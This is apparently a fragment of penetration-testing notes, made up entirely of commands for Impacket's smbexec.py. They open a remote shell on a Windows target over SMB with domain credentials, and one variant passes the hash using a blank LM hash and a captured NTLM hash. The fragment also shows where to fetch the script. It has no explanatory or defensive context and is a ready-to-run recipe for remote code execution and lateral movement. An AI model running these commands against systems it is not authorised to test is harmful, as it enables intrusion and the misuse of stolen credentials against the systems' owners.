```python - kali
python3 /usr/share/doc/python3-impacket/examples/smbexec.py $DOMAIN/$USER:$PASSWORD@$TARGET
```

or

```bash - kali
wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/smbexec.py
```

#### Shell with smbexec.py
```python - kali
smbexec.py $DOMAIN/$USER:$PASSWORD@$TARGET
```

#### Passing the hash (blank LM hash)
```python - kali
smbexec.py $DOMAIN/$USER@$TARGET -hashes aad3b435b51404eeaad3b435b51404ee:$HASH
```
